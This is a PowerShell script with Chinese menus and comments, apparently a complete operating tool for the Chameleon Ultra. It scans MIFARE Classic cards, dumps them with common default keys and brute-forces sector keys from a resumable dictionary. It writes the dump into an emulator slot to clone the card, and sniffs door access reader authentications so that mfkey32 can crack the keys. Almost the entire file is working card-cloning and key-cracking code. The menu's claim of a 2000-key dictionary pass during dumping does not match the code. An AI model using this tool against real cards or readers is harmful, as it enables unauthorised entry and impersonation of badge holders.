
#requires -version 5
# ============================================================
#  CU Tool - Chameleon Ultra 一体化操作工具 (pc4 build)
#  功能: 扫卡/全卡dump/密钥攻击/写CU卡槽/模式切换/嗅探+mfkey32
#  依赖: mfkey32v2.exe (同目录), libnfc.db (字典, 可选)
# ============================================================
$ErrorActionPreference = 'Continue'
$BaseDir = Split-Path -Parent $MyInvocation.MyCommand.Path
$DataDir = Join-Path $BaseDir 'nfc-data'
if(-not (Test-Path $DataDir)){ New-Item -ItemType Directory -Path $DataDir | Out-Null }
$DictPath = 'D:\soft\PCR532\nfc-bin\libnfc.db'
if(-not (Test-Path $DictPath)){ $DictPath = Join-Path $BaseDir 'libnfc.db' }

$script:Port = $null

function Find-CUPort {
  $dev = Get-CimInstance Win32_PnPEntity | Where-Object { $_.PNPDeviceID -match 'VID_6868&PID_8686' -and $_.Name -match 'COM\d' }
  if($dev -match 'COM(\d+)'){ return $Matches[1] }
  return $null
}

function Open-Port {
  if($script:Port -and $script:Port.IsOpen){ return $true }
  $com = Find-CUPort
  if(-not $com){ Write-Host '[X] 未找到变色龙 (VID_6868) - 请检查USB连接' -ForegroundColor Red; return $false }
  try {
    $script:Port = New-Object System.IO.Ports.SerialPort("COM$com",115200,'None',8,'One')
    $script:Port.Handshake='None'; $script:Port.DtrEnable=$true; $script:Port.RtsEnable=$true
    $script:Port.ReadTimeout=2000; $script:Port.WriteTimeout=3000
    $script:Port.Open()
    Start-Sleep -Milliseconds 300; $script:Port.DiscardInBuffer()
    Write-Host "[OK] 已连接 COM$com" -ForegroundColor Green
    return $true
  } catch {
    Write-Host "[X] 打开 COM$com 失败: $($_.Exception.Message)" -ForegroundColor Red
    try{ $script:Port.Dispose() }catch{}
    $script:Port = $null
    [GC]::Collect(); [GC]::WaitForPendingFinalizers()
    return $false
  }
}

function Close-Port {
  if($script:Port){
    try{ if($script:Port.IsOpen){ $script:Port.Close() } }catch{}
    $script:Port.Dispose()
    $script:Port = $null
  }
  [GC]::Collect(); [GC]::WaitForPendingFinalizers(); [GC]::Collect()
}

function Build([int]$cmd,[byte[]]$data){
  $len=$data.Length
  $h=[byte[]](0x11,0xEF,(($cmd -shr 8) -band 0xFF),($cmd -band 0xFF),0,0,(($len -shr 8) -band 0xFF),($len -band 0xFF))
  $s=0; foreach($b in $h[2..7]){$s=($s+$b) -band 0xFF}
  $l=New-Object System.Collections.Generic.List[byte]; $l.AddRange($h); $l.Add([byte]((256-$s) -band 0xFF))
  $s3=0; foreach($b in $data){$s3=($s3+$b) -band 0xFF; $l.Add($b)}; $l.Add([byte]((256-$s3) -band 0xFF))
  return ,$l.ToArray()
}
function Cmd([int]$cmd,[byte[]]$data,[int]$waitMs=2500){
  $f=Build $cmd $data
  $script:Port.DiscardInBuffer(); $script:Port.Write($f,0,$f.Length)
  $sw=[System.Diagnostics.Stopwatch]::StartNew()
  $got=New-Object System.Collections.Generic.List[byte]
  while($sw.ElapsedMilliseconds -lt $waitMs){
    if($script:Port.BytesToRead -gt 0){ $b=New-Object byte[] ($script:Port.BytesToRead); $null=$script:Port.Read($b,0,$b.Length); $got.AddRange($b)
      if($got.Count -ge 10){ $dl=($got[6] -shl 8)+$got[7]; if($got.Count -ge 10+$dl){ break } } }
    else { Start-Sleep -Milliseconds 2 }
  }
  return ,$got.ToArray()
}
function Hex($b){ ($b | ForEach-Object { $_.ToString('X2') }) -join '' }
function StatusOf($r){ if($r.Length -ge 10){ return (($r[4] -shl 8)+$r[5]) } else { return -1 } }

# ---------- 1. 扫卡 ----------
function Do-Scan {
  if(-not (Open-Port)){ return }
  $null = Cmd 1001 ([byte[]](1)) 2000    # reader mode
  $r = Cmd 2000 ([byte[]]@()) 3000
  $st = StatusOf $r
  if($r.Length -lt 12){ Write-Host '[X] 无卡' -ForegroundColor Red; return }
  $d = $r[9..($r.Length-2)]
  $uidLen = $d[0]
  $uid = Hex $d[1..$uidLen]
  $atqa = Hex $d[($uidLen+1)..($uidLen+2)]
  $sak = Hex $d[($uidLen+3)]
  Write-Host "UID  : $uid"
  Write-Host "ATQA : $atqa   SAK: $sak"
  if($sak -eq '08'){ Write-Host '卡型 : MIFARE Classic 1K' }
  elseif($sak -eq '18'){ Write-Host '卡型 : MIFARE Classic 4K' }
  elseif($sak -eq '09'){ Write-Host '卡型 : MIFARE Mini' }
  else { Write-Host "卡型 : 未知 (SAK $sak)" }
  return $uid
}

# ---------- 2. 全卡 dump ----------
function Do-Dump {
  if(-not (Open-Port)){ return }
  $uid = Do-ScanQuiet
  if(-not $uid){ return }
  # keys: try common defaults first (fast). If sectors fail -> tell user to run [3] full dict.
  $keys = @('FFFFFFFFFFFF','A0A1A2A3A4A5','B0B1B2B3B4B5','3FFC4D9BA150','50A19B4DFC3F','A396EFA4E24F','A31667A8CEC1','518B3354E760','4D3A99C351DD','1A982C7E459A','7130EA93B3BF','71F3A315AD26','000000000000','AABBCCDDEEFF','123456ABCDEF','1A2B3C4D5E6F')
  $lines = New-Object System.Collections.Generic.List[string]
  $foundKeys = @{}
  for($sec=0;$sec -lt 16;$sec++){
    $trailer = $sec*4+3
    $hit = $null; $hitType = 0x60
    foreach($k in $keys){
      foreach($t in 0x60,0x61){
        $kb = for($i=0;$i -lt 6;$i++){ [Convert]::ToByte($k.Substring($i*2,2),16) }
        $pl = New-Object System.Collections.Generic.List[byte]
        $pl.Add([byte]$t); $pl.Add([byte]$trailer); $pl.AddRange([byte[]]$kb)
        $r = Cmd 2007 $pl.ToArray() 1800
        if((StatusOf $r) -eq 0){ $hit=$k; $hitType=$t; break }
      }
      if($hit){ break }
    }
    if(-not $hit){ Write-Host "扇区 $sec : 密钥未找到, 跳过 (可用功能[3]字典全量攻击)" -ForegroundColor Yellow; continue }
    if(-not $foundKeys.ContainsKey($hit)){ $foundKeys[$hit]=@() }
    $foundKeys[$hit] += $sec
    for($blk=$sec*4;$blk -lt $sec*4+4;$blk++){
      $kb = for($i=0;$i -lt 6;$i++){ [Convert]::ToByte($hit.Substring($i*2,2),16) }
      $pl = New-Object System.Collections.Generic.List[byte]
      $pl.Add([byte]$hitType); $pl.Add([byte]$blk); $pl.AddRange([byte[]]$kb)
      $r = Cmd 2008 $pl.ToArray() 2000
      if($r.Length -ge 26){ $lines.Add("BLK $blk : $(Hex $r[9..24])") } else { $lines.Add("BLK $blk : READ_FAIL") }
    }
    Write-Host "扇区 $sec : OK (key=$hit)" -ForegroundColor Green
  }
  $ts = Get-Date -Format 'yyyyMMdd_HHmmss'
  $out = Join-Path $DataDir "dump_$ts.txt"
  [IO.File]::WriteAllLines($out, $lines)
  Write-Host "`n[DONE] 已保存: $out ($($lines.Count)/64 块)" -ForegroundColor Green
  foreach($k in $foundKeys.Keys){ Write-Host "  key $k -> 扇区: $($foundKeys[$k] -join ',')" }
  # restore emulator mode if it was emulator before? ask user: stay reader mode.
}

function Do-ScanQuiet {
  $r = Cmd 2000 ([byte[]]@()) 3000
  if($r.Length -lt 12){ return $null }
  $d = $r[9..($r.Length-2)]
  return (Hex $d[1..$d[0]])
}

# ---------- 3. 密钥字典攻击 (断点续跑) ----------
function Do-BF {
  if(-not (Open-Port)){ return }
  if(-not (Test-Path $DictPath)){ Write-Host "[X] 找不到字典 $DictPath" -ForegroundColor Red; return }
  $db=[System.IO.File]::ReadAllBytes($DictPath)
  $total=[int][Math]::Floor($db.Length/6)
  $sec = Read-Host '目标扇区 (0-15, 默认0)'; if(-not $sec){ $sec=0 }
  $sec=[int]$sec; $trailer=$sec*4+3
  $posF = Join-Path $DataDir "bf_pos_s$sec.txt"
  $logF = Join-Path $DataDir "bf_log_s$sec.txt"
  $start = 0
  if(Test-Path $posF){ $start=[int](Get-Content $posF); Write-Host "检测到上次进度: idx=$start, 从此处继续" }
  Write-Host "字典共 $total 键, 目标: 扇区 $sec (块 $trailer), Ctrl+C 可中断, 进度已保存"
  $key = New-Object byte[] 6
  $t0=Get-Date; $tried=0
  for($idx=$start;$idx -lt $total;$idx++){
    for($j=0;$j -lt 6;$j++){ $key[$j]=$db[$idx*6+$j] }
    $pl = New-Object System.Collections.Generic.List[byte]
    $pl.Add([byte]0x60); $pl.Add([byte]$trailer); foreach($k in $key){ $pl.Add($k) }
    $r = Cmd 2007 $pl.ToArray() 1500
    $tried++
    if($r.Length -ge 10 -and ((($r[4] -shl 8)+$r[5]) -eq 0)){
      # strict verify by reading trailer
      $pl2 = New-Object System.Collections.Generic.List[byte]
      $pl2.Add([byte]0x60); $pl2.Add([byte]$trailer); foreach($k in $key){ $pl2.Add($k) }
      $r2 = Cmd 2008 $pl2.ToArray() 2000
      if($r2.Length -ge 26){
        Write-Host "`n[HIT] keyA=$(Hex $key) idx=$idx" -ForegroundColor Green
        Add-Content $logF ("HIT s$sec A " + (Hex $key))
        [IO.File]::WriteAllText($posF,$idx.ToString())
        return
      }
    }
    if(($tried % 500) -eq 0){
      $el=((Get-Date)-$t0).TotalSeconds
      $rate=[math]::Round($tried/$el,1)
      $eta=[math]::Round(($total-$idx)/[math]::Max($rate,0.1)/3600,1)
      [IO.File]::WriteAllText($posF,$idx.ToString())
      Write-Host ("  idx=$idx/$total rate=$rate/s eta=${eta}h") -ForegroundColor Cyan
    }
  }
  Write-Host '字典跑完无命中' -ForegroundColor Yellow
}

# ---------- 4. 写CU卡槽 (把dump写入卡槽模拟) ----------
function Do-WriteSlot {
  if(-not (Open-Port)){ return }
  $dumpF = Get-ChildItem (Join-Path $DataDir 'dump_*.txt') | Sort-Object LastWriteTime -Descending | Select-Object -First 1
  if($dumpF){ Write-Host "最新dump: $($dumpF.Name)" }
  $path = Read-Host "dump文件路径 (回车=用最新)"; if($path){ $dumpF = Get-Item $path }
  if(-not $dumpF){ Write-Host '[X] 没有dump文件' -ForegroundColor Red; return }
  $blocks = @{}
  foreach($ln in (Get-Content $dumpF.FullName)){
    if($ln -match 'BLK (\d+) : ([0-9A-F]{32})'){ $blocks[[int]$Matches[1]]=$Matches[2] }
  }
  if($blocks.Count -lt 64){
    Write-Host "[!] dump不完整: $($blocks.Count)/64 块 (扇区密钥未全破)" -ForegroundColor Yellow
    $ans = Read-Host '缺失块将写入 0x00，trailer 会用默认钥覆盖! 继续会破坏卡内未知数据。确认继续? (y/N)'
    if($ans -ne 'y'){ Write-Host '已取消'; return }
  }
  $slot = Read-Host '写入哪个卡槽 (1-8, 默认8)'; if(-not $slot){ $slot=8 }
  $slotIdx = [int]$slot - 1
  # uid from block0
  $b0 = $blocks[0]
  $uid = $b0.Substring(0,8)
  Write-Host "目标: 槽$slot UID=$uid"
  $null = Cmd 1003 ([byte[]]([byte]$slotIdx)) 2000
  $null = Cmd 1004 ([byte[]]([byte]$slotIdx,0x03,0xE9)) 2000   # MIFARE_1024
  $null = Cmd 1005 ([byte[]]([byte]$slotIdx,0x03,0xE9)) 4000   # default data
  $null = Cmd 1006 ([byte[]]([byte]$slotIdx,1,1)) 2000         # HF enable
  # anti-coll: uidlen|uid|atqa(onair)|sak|atslen
  $b0b = for($i=0;$i -lt 32;$i+=2){ [Convert]::ToByte($b0.Substring($i,2),16) }
  $ac = New-Object System.Collections.Generic.List[byte]
  $ac.Add([byte]4); foreach($x in $b0b[0..3]){ $ac.Add($x) }
  $ac.Add([byte]0x04); $ac.Add([byte]0x00); $ac.Add([byte]0x08); $ac.Add([byte]0x00)
  $r = Cmd 4001 $ac.ToArray() 2000
  # write blocks in 3 frames
  foreach($startB in 0,31,62){
    $endB = [Math]::Min($startB+31,64)
    $pl = New-Object System.Collections.Generic.List[byte]
    $pl.Add([byte]$startB)
    for($b=$startB;$b -lt $endB;$b++){
      $hx = $blocks[$b]; if(-not $hx){ $hx = '0' * 32 }
      for($i=0;$i -lt 32;$i+=2){ $pl.Add([Convert]::ToByte($hx.Substring($i,2),16)) }
    }
    $r = Cmd 4000 $pl.ToArray() 8000
    if((StatusOf $r) -ne 0x0068){ Write-Host "[X] 写块 $startB..$($endB-1) 失败" -ForegroundColor Red; return }
  }
  $null = Cmd 1009 ([byte[]]@()) 5000      # save flash
  $null = Cmd 1001 ([byte[]](0)) 2000      # emulator mode
  Write-Host "[DONE] 槽$slot 已写入并切换到模拟模式" -ForegroundColor Green
}

# ---------- 5. 模式切换 ----------
function Do-Mode {
  if(-not (Open-Port)){ return }
  $r = Cmd 1002 ([byte[]]@()) 1500
  $cur = if($r.Length -ge 12){ $r[9] } else { 255 }
  $curName = if($cur -eq 0){'模拟模式'}elseif($cur -eq 1){'读卡模式'}else{"未知($cur)"}
  Write-Host "当前: $curName"
  $m = Read-Host '切换到 (0=模拟 1=读卡, 回车=不改)'
  if($m -ne ''){
    $null = Cmd 1001 ([byte[]]([byte][int]$m)) 2000
    Write-Host '已切换'
  }
  $s = Read-Host '激活卡槽 (1-8, 回车=不改)'
  if($s -ne ''){ $null = Cmd 1003 ([byte[]]([byte]([int]$s-1))) 2000; Write-Host "已激活槽 $s" }
}

# ---------- 6. 嗅探+mfkey32 ----------
function Do-Sniff {
  if(-not (Open-Port)){ return }
  $exe = Join-Path $BaseDir 'mfkey32v2.exe'
  if(-not (Test-Path $exe)){ Write-Host "[X] 缺少 mfkey32v2.exe (放同目录)" -ForegroundColor Red; return }
  $null = Cmd 1001 ([byte[]](0)) 2000   # emulator mode
  $null = Cmd 4004 ([byte[]](1)) 2000   # detection enable
  Write-Host @'

嗅探已开启。请把变色龙放到门禁读卡器上刷几次 (>=2次同扇区认证)。
'@
  Read-Host '刷完后回车继续'
  $r = Cmd 4005 ([byte[]]@()) 2000
  if($r.Length -lt 14){ Write-Host '[X] 读不到日志数' -ForegroundColor Red; return }
  $cnt = (($r[9] -shl 24) + ($r[10] -shl 16) + ($r[11] -shl 8) + $r[12])
  Write-Host "捕获认证: $cnt 条"
  if($cnt -lt 2){ Write-Host '[X] 至少需要2条才能破解' -ForegroundColor Red; return }
  $entries = @()
  for($i=0;$i -lt $cnt;$i+=28){
    $n = [Math]::Min(28, $cnt-$i)
    $pl = New-Object System.Collections.Generic.List[byte]
    foreach($v in ($i -shr 24 -band 0xFF),($i -shr 16 -band 0xFF),($i -shr 8 -band 0xFF),($i -band 0xFF)){ $pl.Add([byte]$v) }
    $r2 = Cmd 4006 $pl.ToArray() 4000
    $d = $r2[9..($r2.Length-2)]
    for($e=0;$e -lt $n;$e++){
      $o = $e*18
      $entries += ,@(($d[$o] -shr 2), $d[$o+1], (Hex $d[($o+2)..($o+5)]), (Hex $d[($o+6)..($o+9)]), (Hex $d[($o+10)..($o+13)]), (Hex $d[($o+14)..($o+17)]))
    }
  }
  $ts = Get-Date -Format 'yyyyMMdd_HHmmss'
  $logF = Join-Path $DataDir "sniff_$ts.txt"
  $entries | ForEach-Object { "blk=$($_[0]) flags=$($_[1]) uid=$($_[2]) nt=$($_[3]) nr=$($_[4]) ar=$($_[5])" } | Set-Content $logF
  Write-Host "日志已存: $logF"
  # group by uid+block, need pairs (two auths)
  $groups = $entries | Group-Object { "$($_[2])_$($_[0])" }
  $cracked = 0
  foreach($g in $groups){
    if($g.Count -lt 2){ continue }
    $a=$g.Group[0]; $b=$g.Group[1]
    Write-Host "mfkey32: uid=$($a[2]) blk=$($a[0])..."
    $out = & $exe ([Convert]::ToUInt32($a[2],16)) ([Convert]::ToUInt32($a[3],16)) ([Convert]::ToUInt32($a[4],16)) ([Convert]::ToUInt32($a[5],16)) ([Convert]::ToUInt32($b[3],16)) ([Convert]::ToUInt32($b[4],16)) ([Convert]::ToUInt32($b[5],16)) 2>&1
    $out | ForEach-Object { Write-Host "  $_" }
    if(($out -join ' ') -match 'Found.*?([0-9A-Fa-f]{12})'){
      Write-Host "[KEY FOUND] $($Matches[1])" -ForegroundColor Green
      Add-Content (Join-Path $DataDir 'cracked_keys.txt') "uid=$($a[2]) blk=$($a[0]) key=$($Matches[1])"
      $cracked++
    }
  }
  Write-Host "破解完成: $cracked 把密钥"
}

# ---------- menu ----------
do {
  Write-Host @'

========= 变色龙一体工具 =========
  [1] 扫卡 (UID/卡型)
  [2] 全卡 dump (自动试常见钥+字典前2000)
  [3] 扇区密钥字典攻击 (断点续跑)
  [4] 写入CU卡槽并模拟 (需先dump)
  [5] 模式切换/选卡槽
  [6] 嗅探门禁+mfkey32破解
  [0] 退出
==================================
'@
  $c = Read-Host '选择'
  switch($c){
    '1' { Do-Scan }
    '2' { Do-Dump }
    '3' { Do-BF }
    '4' { Do-WriteSlot }
    '5' { Do-Mode }
    '6' { Do-Sniff }
  }
} while($c -ne '0')
Close-Port
